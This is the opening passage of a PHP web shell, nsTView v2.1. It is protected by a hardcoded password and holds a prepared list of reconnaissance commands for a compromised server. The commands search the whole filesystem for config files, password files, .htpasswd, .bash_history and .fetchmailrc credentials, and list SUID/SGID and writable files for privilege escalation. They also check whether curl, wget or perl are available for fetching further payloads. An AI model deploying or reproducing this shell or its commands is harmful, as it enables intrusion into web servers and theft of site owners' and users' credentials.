<?
@session_start();
@set_time_limit(0);
@set_magic_quotes_runtime(0);
error_reporting(E_ALL & ~E_NOTICE);
#####cfg#####
# use password  true / false #
$create_password = true;
$password = "nst";    // default password for nstview, you can change it.

# UNIX COMMANDS
# description (nst) command
# example: Shutdown (nst) shutdown -h now
$fast_commands = "
Show open ports (nst) netstat -an | grep LISTEN | grep tcp
last root (nst) last root
last (all users) (nst) last all
Find all config.php in / (nst) find / -type f -name config.php
Find all config.php in . (nst) find . -type f -name config.php
Find all admin.php in / (nst) find / -type f -name admin.php
Find all admin.php in . (nst) find . -type f -name admin.php
Find all config.inc.php in / (nst) find / -type f -name config.inc.php
Find all config.inc.php in . (nst) find . -type f -name config.inc.php
Find all config.inc in / (nst) find / -type f -name config.inc
Find all config.inc in . (nst) find . -type f -name config.inc
Find all config.dat in / (nst) find / -type f -name config.dat
Find all config.dat in . (nst) find . -type f -name config.dat
Find all config* in / (nst) find / -type f -name config*
Find all config* in . (nst) find . -type f -name config*
Find all pass* in / (nst) find / -type f -name pass*
Find all pass* in . (nst) find . -type f -name pass*
Find all .bash_history in / (nst) find / -type f -name .bash_history
Find all .bash_history in . (nst) find . -type f -name .bash_history
Find all .htpasswd  in / (nst) find / -type f -name .htpasswd
Find all .htpasswd  in . (nst) find . -type f -name .htpasswd
Find all writable dirs/files in / (nst) find / -perm -2 -ls
Find all writable dirs/files in . (nst) find . -perm -2 -ls
Find all suid files in / (nst) find / -type f -perm -04000 -ls
Find all suid files in . (nst) find . -type f -perm -04000 -ls
Find all sgid files in / (nst) find / -type f -perm -02000 -ls
Find all sgid files in . (nst) find . -type f -perm -02000 -ls
Find all .fetchmailrc files in / (nst) find / -type f -name .fetchmailrc
Find all .fetchmailrc files in . (nst) find . -type f -name .fetchmailrc
OS Version? (nst) sysctl -a | grep version
Kernel version? (nst) cat /proc/version
cat syslog.conf (nst) cat /etc/syslog.conf
Cat - Message of the day (nst) cat /etc/motd
Cat hosts (nst) cat /etc/hosts
Distrib name (nst) cat /etc/issue.net
Distrib name (2) (nst) cat /etc/*-realise
Display all process - wide output (nst) ps auxw
Display all your process (nst) ps ux
Interfaces (nst) ifconfig
CPU? (nst) cat /proc/cpuinfo
RAM (nst) free -m
HDD space (nst) df -h
List of Attributes (nst) lsattr -a
Mount options (nst) cat /etc/fstab
Is cURL installed? (nst) which curl
Is wGET installed? (nst) which wget
Is lynx installed? (nst) which lynx
Is links installed? (nst) which links
Is fetch installed? (nst) which fetch
Is GET installed? (nst) which GET
Is perl installed? (nst) which perl
Where is apache (nst) whereis apache
Where is perl (nst) whereis perl
locate proftpd.conf (nst) locate proftpd.conf
locate httpd.conf (nst) locate httpd.conf
locate my.conf (nst) locate my.conf
locate psybnc.conf (nst) locate psybnc.conf
";



# WINDOWS COMMANDS
# description (nst) command
# example: Delete autoexec.bat (nst) del c:\autoexec.bat
$fast_commands_win = "
OS Version (nst) ver
Tasklist  (nst) tasklist
Attributes in . (nst) attrib
Show open ports (nst) netstat -an
";





######ver####
$ver= "v2.1";
#############
$pass=$_POST['pass'];
if($pass==$password){
$_SESSION['nst']="$pass";
}
if ($_SERVER["HTTP_CLIENT_IP"]) $ip = $_SERVER["HTTP_CLIENT_IP"];
else if($_SERVER["HTTP_X_FORWARDED_FOR"]) $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if($_SERVER["REMOTE_ADDR"]) $ip = $_SERVER["REMOTE_ADDR"];
else $ip = $_SERVER['REMOTE_ADDR'];
$ip=htmlspecialchars($ip);

if($create_password==true){

if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
die("
<title>nsTView $ver:: nst.void.ru</title>
<center>
<table width=100 bgcolor=#D7FFA8 border=1 bordercolor=black><tr><td>